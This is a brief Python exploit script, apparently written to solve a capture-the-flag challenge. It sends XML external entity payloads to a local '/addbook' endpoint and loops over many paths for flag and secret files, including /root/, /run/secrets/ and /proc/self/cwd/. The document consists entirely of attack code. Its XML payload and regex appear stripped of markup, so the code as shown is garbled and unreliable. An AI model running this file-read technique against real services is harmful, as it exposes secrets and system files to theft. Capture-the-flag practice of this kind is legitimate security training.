python3 - <<'PY'
import requests,re,html
bases=['','/','/app/','/usr/src/app/','/var/www/','/opt/app/','/home/app/','/root/','/tmp/','/run/secrets/','/proc/self/cwd/']
names=['flag','flag.txt','FLAG','FLAG.txt','.flag','flag.php','flag.py','secret','secret.txt','flag1.txt','flag.xml','flag.json','ctf/flag.txt','flags/flag.txt','challenge/flag.txt']
paths=[]
for b in bases:
    for n in names:
        p=(b+n) if b.startswith('/') else '/'+n
        if p not in paths: paths.append(p)
# also cwd relative via proc
for n in names:
    paths.append('/proc/self/cwd/'+n)

def read(path):
    xml=f'''\n]>\n&xxe;1EdPubChapA1c'''
    r=requests.post('http://127.0.0.1:9100/addbook', data={'xml':xml}, timeout=4)
    if 'flag{' in r.text:
        print('FOUND in',path)
        print(r.text)
        raise SystemExit
    m=re.search(r'(.*?)', r.text, re.S)
    if m:
        s=html.unescape(m.group(1))
        if s.strip(): print('NONEMPTY',path,repr(s[:200]))
for p in paths:
    try: read(p)
    except Exception as e: print('ERR',p,e)
print('done no flag')
